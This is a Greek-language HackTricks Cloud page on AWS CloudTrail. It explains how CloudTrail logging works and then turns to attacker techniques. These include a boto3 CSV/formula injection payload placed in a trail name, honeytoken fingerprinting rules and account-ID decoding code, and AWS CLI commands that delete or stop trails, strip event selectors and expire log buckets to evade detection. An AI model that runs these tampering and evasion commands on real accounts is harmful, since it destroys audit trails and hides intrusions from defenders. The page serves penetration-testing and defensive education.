# AWS - CloudTrail Enum

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## **CloudTrail**

Το AWS CloudTrail **καταγράφει και παρακολουθεί δραστηριότητα στο περιβάλλον σας AWS**. Καταγράφει λεπτομερή **αρχεία συμβάντων**, συμπεριλαμβανομένου ποιος έκανε τι, πότε και από πού, για όλες τις αλληλεπιδράσεις με πόρους AWS. Αυτό παρέχει ένα ίχνος ελέγχου αλλαγών και ενεργειών, βοηθώντας στην ανάλυση ασφάλειας, τον έλεγχο συμμόρφωσης και την παρακολούθηση αλλαγών πόρων. Το CloudTrail είναι απαραίτητο για την κατανόηση της συμπεριφοράς χρηστών και πόρων, την ενίσχυση της ασφάλειας και την εξασφάλιση κανονιστικής συμμόρφωσης.

Κάθε καταγεγραμμένο συμβάν περιέχει:

* Το όνομα του API που κλήθηκε: `eventName`
* Η υπηρεσία που κλήθηκε: `eventSource`
* Η ώρα: `eventTime`
* Η διεύθυνση IP: `SourceIPAddress`
* Η μέθοδος του agent: `userAgent`. Παραδείγματα:
* Signing.amazonaws.com - Από το AWS Management Console
* console.amazonaws.com - Root χρήστης του λογαριασμού
* lambda.amazonaws.com - AWS Lambda
* Οι παράμετροι αιτήματος: `requestParameters`
* Τα στοιχεία απόκρισης: `responseElements`

Τα συμβάντα γράφονται σε ένα νέο αρχείο καταγραφής **περίπου κάθε 5 λεπτά σε ένα αρχείο JSON**, διατηρούνται από το CloudTrail και τελικά, τα αρχεία καταγραφής **παραδίδονται στο S3 περίπου 15 λεπτά μετά**.\
Τα αρχεία καταγραφής του CloudTrail μπορούν να **συγκεντρωθούν σε λογαριασμούς και περιοχές.**\
Το CloudTrail επιτρέπει τη χρήση **ακεραιότητας αρχείων καταγραφής για να μπορείτε να επαληθεύσετε ότι τα αρχεία καταγραφής σας δεν έχουν αλλάξει** από τότε που το CloudTrail τα παρέδωσε σε εσάς. Δημιουργεί ένα SHA-256 hash των καταγραφών μέσα σε ένα αρχείο digest. Ένα sha-256 hash των νέων καταγραφών δημιουργείται κάθε ώρα.\
Όταν δημιουργείτε ένα Trail, οι επιλογές συμβάντων θα σας επιτρέψουν να υποδείξετε το trail να καταγράφει: Διαχειριστικά, δεδομένα ή συμβάντα insights.

Τα αρχεία καταγραφής αποθηκεύονται σε έναν κάδο S3. Από προεπιλογή χρησιμοποιείται η Κρυπτογράφηση Πλευράς Διακομιστή (SSE-S3) ώστε το AWS να αποκρυπτογραφεί το περιεχόμενο για τα άτομα που έχουν πρόσβαση σε αυτό, αλλά για επιπλέον ασφάλεια μπορείτε να χρησιμοποιήσετε SSE με KMS και τα δικά σας κλειδιά.

Τα αρχεία καταγραφής αποθηκεύονται σε έναν **κάδο S3 με αυτή τη μορφή ονόματος**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Όντας το BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Παράδειγμα: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Μέσα σε κάθε φάκελο κάθε αρχείο καταγραφής θα έχει ένα **όνομα που ακολουθεί αυτή τη μορφή**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Συμβατική Ονομασία Αρχείων Καταγραφής

![](<../../../../.gitbook/assets/image (122).png>)

Επιπλέον, **τα αρχεία digest (για έλεγχο ακεραιότητας αρχείων)** θα βρίσκονται στον **ίδιο κάδο** σε:

![](<../../../../.gitbook/assets/image (195).png>)

### Συγκέντρωση Καταγραφών από Πολλαπλούς Λογαριασμούς

* Δημιουργήστε ένα Trial στον λογαριασμό AWS όπου θέλετε να παραδοθούν τα αρχεία καταγραφής
* Εφαρμόστε δικαιώματα στον προορισμό S3 κάδο επιτρέποντας διασταυρούμενη πρόσβαση λογαριασμού για το CloudTrail και επιτρέψτε σε κάθε λογαριασμό AWS που χρειάζεται πρόσβαση
* Δημιουργήστε ένα νέο Trail στους άλλους λογαριασμούς AWS και επιλέξτε να χρησιμοποιήσετε τον κάδο που δημιουργήθηκε στο βήμα 1

Ωστόσο, ακόμα κι αν μπορείτε να αποθηκεύσετε όλα τα αρχεία καταγραφής στον ίδιο κάδο S3, δεν μπορείτε να συγκεντρώσετε τα αρχεία καταγραφής του CloudTrail από πολλαπλούς λογαριασμούς σε ένα CloudWatch Logs που ανήκει σε έναν μόνο λογαριασμό AWS.

{% hint style="danger" %}
Θυμηθείτε ότι ένας λογαριασμός μπορεί να έχει **διαφορετικά Trails** από το CloudTrail **ενεργοποιημένα** αποθηκεύοντας τα ίδια (ή διαφορετικά) αρχεία καταγραφής σε διαφορετικούς κάδους.
{% endhint %}

### Cloudtrail από όλους τους λογαριασμούς org σε 1

Όταν δημιουργείτε ένα CloudTrail, είναι δυνατό να υποδείξετε να ενεργοποιηθεί το cloudtrail για όλους τους λογαριασμούς στην org και να λάβετε τα αρχεία καταγραφής σε έναν μόνο κάδο:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Με αυτόν τον τρόπο μπορείτε εύκολα να διαμορφώσετε το CloudTrail σε όλες τις περιοχές όλων των λογαριασμών και να κεντροποιήσετε τα αρχεία καταγραφής σε έναν λογαριασμό (που πρέπει να προστατεύσετε).

### Έλεγχος Αρχείων Καταγραφής

Μπορείτε να ελέγξετε ότι τα αρχεία καταγραφής δεν έχουν αλλοιωθεί εκτελώντας

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail μπορεί αυτόματα να στείλει logs στο CloudWatch ώστε να ρυθμίσετε ειδοποιήσεις που σας προειδοποιούν όταν εκτελούνται ύποπτες δραστηριότητες.**\
Σημειώστε ότι για να επιτρέψετε στο CloudTrail να στείλει τα logs στο CloudWatch, πρέπει να δημιουργηθεί ένας **ρόλος** που επιτρέπει αυτή τη δράση. Αν είναι δυνατόν, συνιστάται να χρησιμοποιήσετε τον προεπιλεγμένο ρόλο της AWS για να εκτελέσετε αυτές τις ενέργειες. Αυτός ο ρόλος θα επιτρέψει στο CloudTrail να:

* CreateLogStream: Αυτό επιτρέπει τη δημιουργία log streams στο CloudWatch Logs
* PutLogEvents: Παράδοση των CloudTrail logs στο CloudWatch Logs log stream

### Event History

Το CloudTrail Event History σας επιτρέπει να επιθεωρήσετε σε έναν πίνακα τα logs που έχουν καταγραφεί:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** αναλύει αυτόματα τα write management events από τα CloudTrail trails και σας ειδοποιεί για ασυνήθιστη δραστηριότητα. Για παράδειγμα, αν υπάρχει αύξηση στα `TerminateInstance` events που διαφέρει από τα καθιερωμένα πρότυπα, θα το δείτε ως ένα Insight event. Αυτά τα events κάνουν την εύρεση και την ανταπόκριση σε ασυνήθιστη δραστηριότητα API πιο εύκολη από ποτέ.

Τα insights αποθηκεύονται στον ίδιο κάδο με τα CloudTrail logs στο: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>Επικύρωση αν τα logs έχουν παραποιηθεί (τροποποιηθεί ή διαγραφεί)</li><li><p>Χρησιμοποιεί digest files (δημιουργεί hash για κάθε αρχείο)</p><ul><li>SHA-256 hashing</li><li>SHA-256 με RSA για ψηφιακή υπογραφή</li><li>ιδιωτικό κλειδί που ανήκει στην Amazon</li></ul></li><li>Χρειάζεται 1 ώρα για να δημιουργηθεί ένα digest file (γίνεται κάθε ώρα)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>Χρησιμοποιήστε IAM policies και S3 bucket policies</p><ul><li>ομάδα ασφαλείας —> admin access</li><li>ελεγκτές —> read only access</li></ul></li><li>Χρησιμοποιήστε SSE-S3/SSE-KMS για να κρυπτογραφήσετε τα logs</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>Περιορίστε την πρόσβαση διαγραφής με IAM και bucket policies</li><li>Ρυθμίστε το S3 MFA delete</li><li>Επικυρώστε με Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

Το AWS Access Advisor βασίζεται στα τελευταία 400 ημέρες AWS **CloudTrail logs για να συγκεντρώσει τα insights του**. Το CloudTrail καταγράφει ένα ιστορικό των AWS API calls και των σχετικών events που έγιναν σε έναν AWS λογαριασμό. Το Access Advisor χρησιμοποιεί αυτά τα δεδομένα για να **δείξει πότε οι υπηρεσίες χρησιμοποιήθηκαν τελευταία φορά**. Αναλύοντας τα CloudTrail logs, το Access Advisor μπορεί να καθορίσει ποιες AWS υπηρεσίες ένας IAM χρήστης ή ρόλος έχει προσπελάσει και πότε συνέβη αυτή η πρόσβαση. Αυτό βοηθά τους διαχειριστές της AWS να λαμβάνουν ενημερωμένες αποφάσεις σχετικά με **τη βελτίωση των δικαιωμάτων**, καθώς μπορούν να εντοπίσουν υπηρεσίες που δεν έχουν προσπελαστεί για μεγάλα χρονικά διαστήματα και να μειώσουν τα υπερβολικά ευρεία δικαιώματα βάσει πραγματικών προτύπων χρήσης.

{% hint style="success" %}
Επομένως, το Access Advisor ενημερώνει για **τα περιττά δικαιώματα που δίνονται στους χρήστες** ώστε ο διαχειριστής να μπορεί να τα αφαιρέσει
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

Είναι δυνατό να πραγματοποιηθεί μια ένεση CVS μέσα στο CloudTrail που θα εκτελέσει αυθαίρετο κώδικα αν τα logs εξαχθούν σε CSV και ανοιχτούν με το Excel.\
Ο ακόλουθος κώδικας θα δημιουργήσει μια καταχώρηση log με ένα κακό όνομα Trail που περιέχει το payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Για περισσότερες πληροφορίες σχετικά με τις CSV Injections ελέγξτε τη σελίδα:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική ελέγξτε [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Παράκαμψη Ανίχνευσης**

### Παράκαμψη HoneyTokens

Τα Honeyokens δημιουργούνται για να **ανιχνεύουν την εξαγωγή ευαίσθητων πληροφοριών**. Στην περίπτωση του AWS, είναι **κλειδιά AWS των οποίων η χρήση παρακολουθείται**, αν κάτι ενεργοποιήσει μια ενέργεια με αυτό το κλειδί, τότε κάποιος πρέπει να έχει κλέψει αυτό το κλειδί.

Ωστόσο, τα Honeytokens όπως αυτά που δημιουργούνται από [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) είτε χρησιμοποιούν αναγνωρίσιμο όνομα λογαριασμού είτε χρησιμοποιούν το ίδιο AWS account ID για όλους τους πελάτες τους. Επομένως, αν μπορείτε να πάρετε το όνομα λογαριασμού και/ή το account ID χωρίς να δημιουργήσει το Cloudtrail κάποιο log, **θα μπορούσατε να ξέρετε αν το κλειδί είναι honeytoken ή όχι**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) έχει κάποιους κανόνες για να ανιχνεύσει αν ένα κλειδί ανήκει σε [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Αν **`canarytokens.org`** εμφανίζεται στο όνομα του ρόλου ή το account ID **`534261010715`** εμφανίζεται στο μήνυμα σφάλματος.
* Δοκιμάζοντάς τα πιο πρόσφατα, χρησιμοποιούν το account **`717712589309`** και εξακολουθούν να έχουν τη συμβολοσειρά **`canarytokens.com`** στο όνομα.
* Αν **`SpaceCrab`** εμφανίζεται στο όνομα του ρόλου στο μήνυμα σφάλματος
* Το **SpaceSiren** χρησιμοποιεί **uuids** για να δημιουργήσει ονόματα χρηστών: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Αν το **όνομα φαίνεται τυχαία δημιουργημένο**, υπάρχουν μεγάλες πιθανότητες να είναι HoneyToken.

#### Λήψη του account ID από το Key ID

Μπορείτε να πάρετε το **Account ID** από το **κωδικοποιημένο** μέσα στο **access key** όπως [**εξηγείται εδώ**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) και να ελέγξετε το account ID με τη λίστα των Honeytokens AWS accounts:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Μην δημιουργείτε καταγραφή

Η πιο αποτελεσματική τεχνική για αυτό είναι στην πραγματικότητα απλή. Απλά χρησιμοποιήστε το κλειδί που μόλις βρήκατε για να αποκτήσετε πρόσβαση σε κάποια υπηρεσία μέσα στον δικό σας λογαριασμό επιτιθέμενου. Αυτό θα κάνει το **CloudTrail να δημιουργήσει καταγραφή μέσα στον ΔΙΚΟ ΣΑΣ λογαριασμό AWS και όχι μέσα στον λογαριασμό του θύματος**.

Το θέμα είναι ότι η έξοδος θα σας δείξει ένα σφάλμα που υποδεικνύει το ID του λογαριασμού και το όνομα του λογαριασμού, έτσι **θα μπορείτε να δείτε αν είναι Honeytoken**.

#### Υπηρεσίες AWS χωρίς καταγραφές

Στο παρελθόν υπήρχαν κάποιες **υπηρεσίες AWS που δεν στέλνουν καταγραφές στο CloudTrail** (βρείτε μια [λίστα εδώ](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Κάποιες από αυτές τις υπηρεσίες θα **απαντήσουν** με ένα **σφάλμα** που περιέχει το **ARN του ρόλου κλειδιού** αν κάποιος μη εξουσιοδοτημένος (το honeytoken κλειδί) προσπαθήσει να αποκτήσει πρόσβαση.

Με αυτόν τον τρόπο, ένας **επιτιθέμενος μπορεί να αποκτήσει το ARN του κλειδιού χωρίς να ενεργοποιήσει καμία καταγραφή**. Στο ARN ο επιτιθέμενος μπορεί να δει το **ID του λογαριασμού AWS και το όνομα**, είναι εύκολο να γνωρίζει τα ID και τα ονόματα των λογαριασμών των εταιρειών του HoneyToken, έτσι με αυτόν τον τρόπο ένας επιτιθέμενος μπορεί να αναγνωρίσει αν το token είναι HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Σημειώστε ότι όλες οι δημόσιες APIs που ανακαλύφθηκαν ότι δεν δημιουργούν καταγραφές CloudTrail έχουν πλέον διορθωθεί, οπότε ίσως χρειαστεί να βρείτε τις δικές σας...

Για περισσότερες πληροφορίες ελέγξτε την [**αρχική έρευνα**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Πρόσβαση σε Τρίτη Υποδομή

Ορισμένες υπηρεσίες AWS θα **δημιουργήσουν κάποια υποδομή** όπως **Βάσεις Δεδομένων** ή **συστοιχίες Kubernetes** (EKS). Ένας χρήστης που **μιλάει απευθείας με αυτές τις υπηρεσίες** (όπως το Kubernetes API) **δεν θα χρησιμοποιήσει το AWS API**, έτσι το CloudTrail δεν θα μπορέσει να δει αυτή την επικοινωνία.

Επομένως, ένας χρήστης με πρόσβαση στο EKS που έχει ανακαλύψει το URL του EKS API θα μπορούσε να δημιουργήσει ένα token τοπικά και **να μιλήσει απευθείας με την υπηρεσία API χωρίς να ανιχνευθεί από το CloudTrail**.

Περισσότερες πληροφορίες στο:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Τροποποίηση Ρυθμίσεων CloudTrail

#### Διαγραφή trails
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Διακοπή trails
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Απενεργοποίηση καταγραφής πολλαπλών περιοχών

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Απενεργοποίηση Καταγραφής με Επιλογείς Συμβάντων

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Στο πρώτο παράδειγμα, ένας μόνος επιλογέας συμβάντων παρέχεται ως πίνακας JSON με ένα μόνο αντικείμενο. Το `"ReadWriteType": "ReadOnly"` υποδεικνύει ότι ο **επιλογέας συμβάντων θα πρέπει να καταγράφει μόνο συμβάντα μόνο για ανάγνωση** (οπότε τα CloudTrail insights **δεν θα ελέγχουν συμβάντα εγγραφής** για παράδειγμα).

Μπορείτε να προσαρμόσετε τον επιλογέα συμβάντων βάσει των συγκεκριμένων απαιτήσεών σας.

#### Διαγραφή logs μέσω πολιτικής κύκλου ζωής S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Τροποποίηση Διαμόρφωσης Κάδου

* Διαγραφή του S3 κάδου
* Αλλαγή πολιτικής κάδου για να αρνηθεί οποιαδήποτε εγγραφή από την υπηρεσία CloudTrail
* Προσθήκη πολιτικής κύκλου ζωής στον S3 κάδο για διαγραφή αντικειμένων
* Απενεργοποίηση του κλειδιού kms που χρησιμοποιείται για την κρυπτογράφηση των καταγραφών CloudTrail

### Cloudtrail ransomware

#### S3 ransomware

Θα μπορούσατε να **δημιουργήσετε ένα ασύμμετρο κλειδί** και να κάνετε το **CloudTrail να κρυπτογραφήσει τα δεδομένα** με αυτό το κλειδί και να **διαγράψετε το ιδιωτικό κλειδί** ώστε τα περιεχόμενα του CloudTrail να μην μπορούν να ανακτηθούν.\
Αυτό είναι βασικά ένα **S3-KMS ransomware** που εξηγείται στο:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Αυτός είναι ένας ευκολότερος τρόπος για να εκτελέσετε την προηγούμενη επίθεση με διαφορετικές απαιτήσεις αδειών:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Αναφορές**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια github.

</details>
{% endhint %}
